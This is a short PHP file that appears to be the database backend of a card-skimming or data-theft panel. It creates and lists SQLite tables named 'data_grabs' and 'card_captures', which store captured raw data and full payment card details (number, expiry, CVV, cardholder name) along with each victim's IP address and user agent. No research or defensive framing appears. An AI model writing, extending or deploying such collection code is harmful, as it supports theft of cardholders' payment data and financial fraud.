<?php
declare(strict_types=1);

function db(): PDO
{
    static $pdo = null;
    if ($pdo instanceof PDO) return $pdo;

    $dir = getenv('DATA_DIR') ?: __DIR__ . '/../data';
    if (!is_dir($dir)) mkdir($dir, 0775, true);

    $pdo = new PDO('sqlite:' . $dir . '/nexus.sqlite', null, null, [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
    $pdo->exec('PRAGMA foreign_keys = ON');
    $pdo->exec('PRAGMA journal_mode = WAL');

    $pdo->exec('CREATE TABLE IF NOT EXISTS data_grabs (
        id         INTEGER PRIMARY KEY AUTOINCREMENT,
        raw_data   TEXT NOT NULL,
        ip         TEXT NOT NULL DEFAULT \'\',
        user_agent TEXT NOT NULL DEFAULT \'\',
        created_at TEXT NOT NULL DEFAULT (datetime(\'now\', \'localtime\'))
    )');

    $pdo->exec('CREATE TABLE IF NOT EXISTS card_captures (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        card_number TEXT NOT NULL,
        expiry      TEXT NOT NULL DEFAULT \'\',
        cvv         TEXT NOT NULL DEFAULT \'\',
        name        TEXT NOT NULL DEFAULT \'\',
        ip          TEXT NOT NULL DEFAULT \'\',
        user_agent  TEXT NOT NULL DEFAULT \'\',
        created_at  TEXT NOT NULL DEFAULT (datetime(\'now\', \'localtime\'))
    )');

    return $pdo;
}

function get_data_grabs(): array
{
    return db()->query('SELECT * FROM data_grabs ORDER BY id DESC')->fetchAll();
}

function get_card_captures(): array
{
    return db()->query('SELECT * FROM card_captures ORDER BY id DESC')->fetchAll();
}
